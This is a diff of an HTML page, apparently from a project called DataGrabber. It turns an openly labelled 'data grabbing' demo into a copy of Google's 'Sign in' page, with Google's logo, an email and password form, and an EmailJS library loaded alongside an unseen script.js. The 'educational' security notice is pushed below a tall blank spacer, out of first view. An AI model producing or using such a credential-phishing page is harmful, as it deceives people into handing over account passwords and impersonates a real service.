@@ -1,15 +1,198 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Warning: Data Grabbing Page</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- For educational purposes only -->
+  <meta charset="UTF-8">
+  <title>Sign in - Google Account</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: "Roboto", "Arial", sans-serif;
+      background: #f2f2f2;
+      min-height: 100vh;
+      width: 100vw;
+      overflow-x: hidden;
+    }
+    .container {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+    }
+    .login-box {
+      background: #fff;
+      box-shadow: 0 2px 8px rgba(60,64,67,.15);
+      border-radius: 8px;
+      margin-top: 48px;
+      width: 100%;
+      max-width: 360px;
+      padding: 40px 32px 32px 32px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .google-logo {
+      width: 48px;
+      margin-bottom: 16px;
+    }
+    .login-title {
+      font-size: 24px;
+      color: #202124;
+      margin-bottom: 8px;
+      font-weight: 400;
+      letter-spacing: -.5px;
+    }
+    .login-desc {
+      font-size: 16px;
+      color: #5f6368;
+      margin-bottom: 24px;
+      text-align: left;
+      width: 100%;
+    }
+    .login-form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .login-form input {
+      font-size: 16px;
+      padding: 12px 10px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      outline: none;
+      background: #fafafa;
+      transition: border-color 0.2s;
+    }
+    .login-form input:focus {
+      border-color: #4285f4;
+      background: #fff;
+    }
+    .login-form button {
+      margin-top: 10px;
+      padding: 10px 0;
+      font-size: 16px;
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .login-form button:active {
+      background: #1764c4;
+    }
+    .forgot-link {
+      font-size: 14px;
+      color: #1a73e8;
+      text-decoration: none;
+      margin-top: 16px;
+      align-self: flex-start;
+    }
+    .divider {
+      width: 100vw;
+      height: 70vh;
+      min-height: 500px;
+      background: transparent;
+      border: none;
+      display: block;
+    }
+    .warning-section {
+      width: 95vw;
+      max-width: 500px;
+      margin: 0 auto 40px auto;
+      background: #fffbe6;
+      border-radius: 8px;
+      border: 1px solid #ffecb3;
+      padding: 32px 20px;
+      box-sizing: border-box;
+      box-shadow: 0 2px 8px rgba(60,64,67,.15);
+    }
+    .warning-section h3 {
+      color: #b07d00;
+      margin-top: 0;
+      margin-bottom: 16px;
+      font-size: 20px;
+      font-weight: 500;
+    }
+    .warning-section p {
+      color: #444;
+      font-size: 15px;
+      margin-bottom: 18px;
+    }
+    .warning-section a {
+      color: #1a73e8;
+      font-size: 15px;
+      text-decoration: underline;
+      margin-bottom: 18px;
+      display: inline-block;
+    }
+    .log-section {
+      margin-top: 24px;
+      padding: 16px;
+      background: #fafafa;
+      border-radius: 5px;
+      border: 1px solid #eee;
+      font-size: 13px;
+      color: #444;
+      word-break: break-all;
+    }
+    #log-status, #login-status {
+      margin-top: 12px;
+      font-size: 13px;
+      color: #b07d00;
+      background: #fffbe6;
+      padding: 5px 10px;
+      border-radius: 4px;
+      border: 1px solid #ffecb3;
+      display: inline-block;
+    }
+    @media (max-width: 600px) {
+      .login-box {
+        max-width: 95vw;
+        padding: 32px 8vw 24px 8vw;
+      }
+      .warning-section {
+        max-width: 98vw;
+        padding: 24px 5vw;
+      }
+    }
+  </style>
 </head>
 <body>
-    <h1 style="color:red;">Warning, this is a data grabbing page for education purposes only.</h1>
-    <div id="log-status"></div>
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-    <script src="script.js"></script>
+  <div class="container">
+    <div class="login-box">
+      <img class="google-logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Google Logo">
+      <div class="login-title">Sign in</div>
+      <div class="login-desc">Use your Google Account</div>
+      <form class="login-form" id="login-form" autocomplete="off">
+        <input type="email" name="email" placeholder="Email or phone" required>
+        <input type="password" name="password" placeholder="Enter your password" required>
+        <button type="submit">Next</button>
+      </form>
+      <a class="forgot-link" href="#">Forgot password?</a>
+      <div id="login-status"></div>
+    </div>
+    <div class="divider"></div>
+    <div class="warning-section">
+      <h3>Security Notice</h3>
+      <p>
+        Never enter your real credentials on unfamiliar websites.<br>
+        This page is for educational demonstration only.
+      </p>
+      <a href="https://github.com/Daeltam/DataGrabber/blob/main/README.md" target="_blank">For more information, see the project's Readme</a>
+      <div class="log-section" id="log-section">
+        <!-- Device log will be filled here -->
+      </div>
+      <div id="log-status"></div>
+    </div>
+  </div>
+  <script src="script.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </body>
 </html>
